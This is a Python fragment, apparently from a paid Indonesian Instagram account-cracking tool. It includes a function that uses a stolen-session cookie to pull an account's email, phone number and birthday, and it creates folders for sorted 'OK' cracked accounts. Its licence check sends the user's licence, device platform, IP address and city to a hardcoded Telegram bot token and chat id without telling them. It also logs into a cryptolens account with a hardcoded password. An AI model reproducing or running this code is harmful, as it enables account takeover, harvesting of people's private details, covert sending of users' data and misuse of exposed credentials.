	try:dt = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}',headers={"user-agent": ua,"x-ig-app-id": "936619743392459"}).json()["data"]["user"]
	except:dt=''
	try:na = dt["full_name"]
	except:na = '-'
	try:pg = dt["edge_followed_by"]["count"]
	except:pg = '0'
	try:mg = dt["edge_follow"]["count"]
	except:mg = '0'
	try:ps = dt["edge_owner_to_timeline_media"]["count"]
	except:ps = '0'
	return na, pg, mg, ps

###---[ CEK DATA ]---###
def cek_data2(coki):
	try:url = ses.get("https://i.instagram.com/api/v1/accounts/edit/web_form_data/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)","x-ig-app-id": "936619743392459"},cookies={"cookie": coki}).json()["form_data"]
	except:url = ""
	try:email = url["email"]
	except:email = "-"
	if len(email)<1: em = "-"
	else: em = email
	try:nop = "0"+url["phone_number"].replace("+62 ","")
	except:nop = "-"
	try:
		y,m,d = url["birthday"].split("-")
		ttl = f"{d}-{tete[m]}-{y}"
	except:ttl = "-"
	try:
		link = parser(ses.get("https://www.instagram.com/accounts/access_tool/", cookies={"cookie":coki}).text, "html.parser").find("body")
		data = json.loads(link.find("script", text=lambda t: t.startswith("window._sharedData")).string.split(" = ", 1)[1].rstrip(";"))["entry_data"]['SettingsPages']
		bikin = datetime.fromtimestamp(int(re.findall('\d+',str(data))[0])).strftime('%d %B %Y')
	except Exception as e: bikin = "-"
	return em, nop, ttl, bikin

###---[ LISENSI ]---###
def lisensi():
	try: os.system("rm -rf .apikeyig.txt")
	except:pass
	clear_layar()
	logo()
	apa = input(f'\n[{H}1{P}] masukan lisensi\n[{H}2{P}] gunakan lisensi trial\n[{H}3{P}] beli lisensi\nmenu : ')
	print('─────────────────────────────')
	if apa in ['1','01']:
		lisen = input(f'[{C}?{P}] silahkan masukan lisensi anda\nlisensi : ')
		print('─────────────────────────────')
		xson, data = cek_lisen(lisen)
		pesan = f"lisen    : {lisen}\nnama   : {data['nama']}\nemail   : {data['email']}\njoin      : {data['join']}\nmasa   : {data['aktif']}\nkey hp : {data['hp']}\nip hp    : {data['ip']}\nkota     : {data['kota']}"
		try:ses.post("https://api.telegram.org/bot5451156884:AAHEe46Uxi5KIEnYWoXn0oc7FbnQB-1WFu8/sendMessage", data = {'chat_id': '5023535689','text': pesan})
		except Exception as e:
			exit(f'[{M}!{P}] terjadi kesalahan harap lapor ke author')
		print(f"[{H}!{P}] lisensi anda terkonfirmasi")
		open('.apikeyig.txt','w').write(lisen)
		back()
	elif apa in ['2','02']:
		exit(f'[{M}!{P}] jumlah user trial telah melewati limit')
	elif apa in ['3','03']:
		isi = ses.get("https://raw.githubusercontent.com/RozhBasXYZ/BOTIG/main/Slot.txt").text.replace("\n","")
		apa = input(f'[{H}1{P}] satu minggu 30.000 - {K}slot full{P}\n[{H}2{P}] satu bulan 100.000 - {H}sisa {isi} slot{P}\n[{H}3{P}] permanent 300.000  - {K}slot full{P}\nmenu : ')
		if apa in ["2"]:
			exit(os.system("xdg-open https://wa.me/62859153130120?text=Assalamualaikum%20bang%0Asaya%20mau%20beli%20lisensi%20instagram%0Ayang%20durasi%2030%20hari%20bang%0A%0Anama%20lisensi%20nya%20%0ANAMA%20%3A%20%0A%0ATerima%20kasih."))
		elif apa in ["1","3"]:
			exit(f'[{M}!{P}] slot user telah penuh')
		else:
			exit(f'[{M}!{P}] mohon isi yang benar')
	else:lisensi()

###---[ CEK LISENSI ]---###
def cek_lisen(lisen):
	hp = platform.platform()
	ses = requests.Session()
	try:
		veri = parser(ses.get("https://app.cryptolens.io/Account/Login").text, "html.parser").find("form",{"method":"post"})
		date = {"__RequestVerificationToken": re.search('name="__RequestVerificationToken" type="hidden" value="(.*?)"',str(veri)).group(1), "UserName": f"{kode_name}@moondoo.org", "Password": "babasxd", "RememberMe": "true", "submit": "Log In", "next": "https://app.cryptolens.io/Product/Detail/16700"}
		coki = {"cookie": ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])}
		xx = ses.post("https://app.cryptolens.io/Account/Login",data=date, cookies=coki).text
		coki = {"cookie": ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])}
		link = parser(ses.get("https://app.cryptolens.io/Product/Detail/16700",cookies=coki).text, "html.parser")
		key = link.find_all("a",{"class":"serialkey"})
		hari = re.findall("\<td\ id\=\"k-period-.*\"\>(.*?)<\/td\>",str(link))
		exp = re.findall("\<td\ id\=\"k-expr-.*\"\>(.*?)<\/td\>",str(link))
		nama = re.findall('\<a\ href\=\"\/Customer\/Edit\/(.*)\"\ target\=\"\_blank\"\>(.*?)<\/a\>',str(link))
		blok = re.findall('\<a\ href\=\"\#\"\ id\=\"k-bk-.*\"\ onclick\=\".*?\"\ style\=\".*?\"\>\s+(.*?)<\/a\>',str(link))
		data_lisen = {}
		for k,h,e,b,n in zip(key,hari,exp,blok,nama):
			data_lisen.update({f"{k.text}":{"nama":n[1], "id":n[0], "aktif":f"{h} Hari", "sampai":e, "blok":b.replace('                            ','')}})
		try:data = data_lisen[lisen]
		except:data = {"blok": "None"}
		if data["blok"]=="Yes":
			print(f' [{M}>{P}] lisensi anda telah di pakai di perangkat lain')
			time.sleep(2)
			exit(lisensi())
		elif data["blok"]=="None":
			print(f' [{M}>{P}] lisensi anda tidak terdaftar')
			time.sleep(2)
			exit(lisensi())
		nama = data["nama"]
		aktif = data["aktif"]
		y,m,d = data["sampai"].split("-")
		awal = datetime.strptime(f"{d}{m}{y}", "%d%m%Y")
		ahir = datetime.strptime(tanggal, "%d%m%Y")
		sisa = awal - ahir
		if sisa.days <=0:
			print(f' [{M}>{P}] durasi lisensi anda habis')
			time.sleep(2)
			exit(lisensi())
		xxx = ses.get("https://nordvpn.com/wp-admin/admin-ajax.php?action=get_user_info_data").json()
		data = {"nama": nama.lower(), "tipe": "premium", "masa": f"{sisa.days}", "kartu": xxx["isp"], "ip": xxx["ip"], "kota": xxx["city"]}
		xson = {"nama": nama, "email": "bladepremium@gmail.com", "join": f"{d}/{m}/{y}", "aktif": sisa.days, "hp": hp, "ip": xxx["ip"], "kota": xxx["city"]}
		return data, xson
	except requests.exceptions.ConnectionError:
		exit(f' [{M}>{P}] tidak ada koneksi internet')
	except Exception as e:
		print(f' [{M}>{P}] lisensi invalid')
		time.sleep(2)
		exit(lisensi())
		
###---[ MAKEDIRECTORY ]---###
def makedirectory():
	try:os.mkdir('/sdcard/STAROZ')
	except:pass
	try:os.mkdir('/sdcard/OK1+')
	except:pass
	try:os.mkdir('/sdcard/OK100+')
	except:pass
	try:os.mkdir('/sdcard/OK1000+')
	except:pass
	back()

if __name__ == '__main__':
	#MetodApi("maryulitajanessa", ["maryulita"])
	makedirectory()
